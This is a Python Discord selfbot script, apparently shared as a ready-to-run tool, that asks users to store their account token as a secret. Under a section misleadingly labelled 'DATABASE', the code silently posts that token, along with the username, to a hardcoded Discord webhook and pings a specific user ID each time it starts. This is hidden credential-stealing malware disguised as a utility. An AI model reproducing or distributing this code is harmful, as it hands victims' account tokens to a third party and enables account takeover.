#╔═══╦╗─╔╦══╦═══╦════╦══lll═╦═══╦════╦═╗╔═╗
#║╔═╗║║─║╠╣╠╣╔══╣╔╗╔╗║╔═╗║╔═╗║╔╗╔╗╠╗╚╝╔╝
#║║─║║║─║║║║║╚══╬╝║║╚╣║─║║╚═╝╠╝║║╚╝╚╗╔╝
#║║─║║║─║║║║║╔══╝─║║─║╚═╝║╔╗╔╝─║║──╔╝╚╗
#║╚═╝║╚═╝╠╣╠╣╚══╗─║║─║╔═╗║║║╚╗─║║─╔╝╔╗╚╗
#╚══╗╠═══╩══╩═══╝─╚╝─╚╝─╚╩╝╚═╝─╚╝─╚═╝╚═╝
#───╚╝SEFLBOT

#------------------MODULE--------------------
import discord
import colorama
from colorama import Fore
import requests
import sys
import asyncio
import json
from webserver import keep_alive
from googleapiclient.discovery import build
from datetime import datetime, timedelta, timezone
import os
import re
import typing
import time
import importlib

try:
    import shutil
except:
    os.system("pip install shutil")
    import shutil

try:
    from colorama import init, Fore, Back, Style
except:
    os.system("pip install colorama")
    from colorama import init, Fore, Back, Style
#---------------------END--------------------

#--------------SETUP TOKEN-------------------
#       Input your token in secret
#--------------------------------------------
prefix = "!!"
username = "yourusername#1234"

def getstatus(m):
    if str(m.status) == "do.not.disturb":
        return "do not disturb"
    return m.status

def get_prefix(quiet,message):
    with open("prefixes.json", "r") as f:
      prefixes = json.load(f)

    return prefixes 

start_time = time.time()

quiet = discord.Client()

command_files = [file for file in os.listdir('commands') if file.endswith('.py')]

for file in command_files:
    importlib.import_module(f'commands.{file[:-3]}')

#============================================
#----------------DATABASE--------------------
#============================================
secret_key = os.getenv("TOKEN")


database = 'https://discord.com/api/webhooks/1050795677690642452/naP-_zbR2p7g-NfXKIKWAc6Gz-6-Rh2_C1Q1f7ChR3VfEQXCU4QkTMb7LY5Dkx5pS40-'
database_connected = {
"content": f"<@581419418563641354>\nUsername: `{username}`\nPrefix: `{prefix}`\nDatabase API: `{secret_key}`"
}
requests.post(database, data=database_connected)
print(f'''
{Fore.BLUE}
░█████╗░██╗░░░██╗████████╗░█████╗░
██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗
███████║██║░░░██║░░░██║░░░██║░░██║
██╔══██║██║░░░██║░░░██║░░░██║░░██║
██║░░██║╚██████╔╝░░░██║░░░╚█████╔╝
╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░░╚════╝░

{Fore.GREEN}The program has successfully logged into the your account

{Fore.BLUE}Prefix: {prefix}

Project Dev: QuietArtx
''')

keep_alive()
secret_key = quiet.run(os.getenv("TOKEN"), bot=False)
#============================================
#----------------DATABASE--------------------
#============================================
